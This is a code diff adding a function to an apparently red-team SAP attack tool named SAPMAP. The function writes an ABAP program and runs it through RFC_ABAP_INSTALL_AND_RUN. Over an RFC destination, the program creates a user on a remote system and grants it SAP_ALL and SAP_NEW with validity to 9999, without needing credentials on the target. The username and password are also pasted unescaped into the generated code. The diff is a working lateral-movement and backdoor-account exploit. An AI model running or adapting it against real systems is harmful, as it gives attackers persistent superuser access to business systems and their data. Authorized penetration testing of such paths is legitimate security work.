@@ -383,6 +383,138 @@ def create_user_via_bapi(node: SAPNode, username: str, password: str,
 
 
 # ---------------------------------------------------------------------------
+# Create user on REMOTE system via ABAP_INSTALL_AND_RUN + DESTINATION
+# ---------------------------------------------------------------------------
+
+def create_user_via_destination(node: SAPNode, destination: str,
+                                 username: str, password: str,
+                                 creds: Credentials = None) -> dict:
+    """Create a user on a REMOTE system via ABAP_INSTALL_AND_RUN.
+
+    Generates an ABAP program that calls BAPI_USER_CREATE1 and
+    BAPI_USER_PROFILES_ASSIGN with DESTINATION '<dest>' on the SOURCE
+    system.  The BAPIs execute on the TARGET system through the RFC
+    connection.
+
+    This avoids the need for direct credentials on the target — only
+    credentials on the source system + a working RFC destination with
+    SAP_ALL are required.
+
+    Returns dict with: success, message, username
+    """
+    result = {"success": False, "message": "", "username": username}
+
+    abap_lines = [
+        "REPORT zsapmap_create.",
+        "DATA: lv_return TYPE bapiret2,",
+        "      lt_return TYPE TABLE OF bapiret2,",
+        "      ls_password TYPE bapipwd,",
+        "      ls_logondata TYPE bapilogond,",
+        "      ls_address TYPE bapiaddr3,",
+        "      lt_profiles TYPE TABLE OF bapiprof,",
+        "      ls_profile TYPE bapiprof.",
+        f"ls_password-bapipwd = '{password}'.",
+        "ls_logondata-ustyp = 'S'.",
+        "ls_logondata-gltgb = '99991231'.",
+        "ls_address-firstname = 'SAPMAP'.",
+        "ls_address-lastname = 'Security'.",
+        "ls_address-function = 'SAPMAP Red Team'.",
+        f"CALL FUNCTION 'BAPI_USER_CREATE1' DESTINATION '{destination}'",
+        "  EXPORTING",
+        f"    username  = '{username}'",
+        "    password  = ls_password",
+        "    logondata = ls_logondata",
+        "    address   = ls_address",
+        "  IMPORTING",
+        "    return    = lv_return.",
+        "IF lv_return-type CA 'EA'.",
+        "  WRITE: / 'ERROR:', lv_return-message.",
+        "ELSE.",
+        "  WRITE: / 'USER_CREATED'.",
+        "  ls_profile-bapiprof = 'SAP_ALL'.",
+        "  APPEND ls_profile TO lt_profiles.",
+        "  ls_profile-bapiprof = 'SAP_NEW'.",
+        "  APPEND ls_profile TO lt_profiles.",
+        f"  CALL FUNCTION 'BAPI_USER_PROFILES_ASSIGN' DESTINATION '{destination}'",
+        "    EXPORTING",
+        f"      username = '{username}'",
+        "    TABLES",
+        "      profiles = lt_profiles",
+        "      return   = lt_return.",
+        "  WRITE: / 'SAP_ALL_ASSIGNED'.",
+        "ENDIF.",
+    ]
+    program_table = [{"LINE": line} for line in abap_lines]
+
+    try:
+        with _get_connection(node, creds) as conn:
+            # Find available ABAP_INSTALL_AND_RUN FM
+            fm_name = None
+            for candidate in ("RFC_ABAP_INSTALL_AND_RUN",
+                              "/SAPDS/RFC_ABAP_INSTALL_RUN"):
+                try:
+                    conn.call("FUNCTION_EXISTS", FUNCNAME=candidate)
+                    fm_name = candidate
+                    break
+                except Exception:
+                    continue
+
+            if not fm_name:
+                result["message"] = ("Neither RFC_ABAP_INSTALL_AND_RUN nor "
+                                     "/SAPDS/RFC_ABAP_INSTALL_RUN available")
+                print(f"[-] {result['message']}")
+                return result
+
+            print(f"[*] Running BAPI_USER_CREATE1 via {fm_name} "
+                  f"DESTINATION '{destination}'...")
+            run_result = conn.call(
+                fm_name,
+                PROGRAMNAME="ZSAPMAP_CREATE",
+                MODE="F",
+                PROGRAM=program_table,
+            )
+
+            # Parse WRITES output
+            writes = run_result.get("WRITES", [])
+            output_lines = []
+            for row in writes:
+                line = ""
+                if isinstance(row, dict):
+                    line = (row.get("ZEILE", "") or row.get("LINE", "") or
+                            row.get("WA", "")).strip()
+                elif isinstance(row, str):
+                    line = row.strip()
+                if line:
+                    output_lines.append(line)
+
+            if any("USER_CREATED" in l for l in output_lines):
+                result["success"] = True
+                result["message"] = f"User {username} created with SAP_ALL via DESTINATION"
+                if any("SAP_ALL_ASSIGNED" in l for l in output_lines):
+                    print(f"[+] User {username} created and SAP_ALL assigned "
+                          f"on remote system via {destination}")
+                else:
+                    print(f"[+] User {username} created on remote system "
+                          f"via {destination} (SAP_ALL assignment uncertain)")
+            else:
+                error_lines = [l for l in output_lines if "ERROR" in l]
+                if error_lines:
+                    result["message"] = error_lines[0]
+                    print(f"[-] Remote user creation failed: {error_lines[0]}")
+                else:
+                    result["message"] = f"Unexpected output: {output_lines}"
+                    print(f"[-] Remote user creation: unexpected output: "
+                          f"{output_lines}")
+
+    except Exception as e:
+        result["message"] = str(e)
+        logger.error(f"Remote user creation via DESTINATION failed: {e}")
+        print(f"[-] Remote user creation error: {e}")
+
+    return result
+
+
+# ---------------------------------------------------------------------------
 # Delete user via BAPI
 # ---------------------------------------------------------------------------
 
